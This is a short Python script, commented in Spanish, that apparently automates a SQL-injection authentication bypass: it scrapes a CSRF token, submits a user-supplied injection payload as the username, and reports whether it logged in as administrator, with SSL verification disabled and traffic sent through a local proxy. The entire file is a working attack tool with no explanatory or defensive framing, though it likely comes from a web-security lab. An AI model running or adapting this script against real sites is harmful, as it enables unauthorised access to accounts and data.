import requests
import sys
import urllib3
from bs4 import BeautifulSoup

# Deshabilitar advertencias por no verificar SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies para pruebas locales
PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    """Obtiene el token CSRF de una URL dada."""
    response = session.get(url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']

def exploit_sqli(session, url, payload):
    """Realiza un ataque de inyección SQL y verifica si fue exitoso."""
    csrf_token = get_csrf_token(session, url)
    data = {'csrf': csrf_token, 'username': payload, 'password': 'randomtext'}
    response = session.post(url, data=data, verify=False, proxies=PROXIES)
    return "Log out" in response.text

def main():
    """Función principal del script."""
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <url> <sql-payload>')
        print(f'Example: {sys.argv[0]} www.example.com "1=1"')
        sys.exit(1)

    url, sqli_payload = sys.argv[1], sys.argv[2]
    session = requests.Session()

    if exploit_sqli(session, url, sqli_payload):
        print('[+] SQL injection successful! Logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')

if __name__ == "__main__":
    main()

    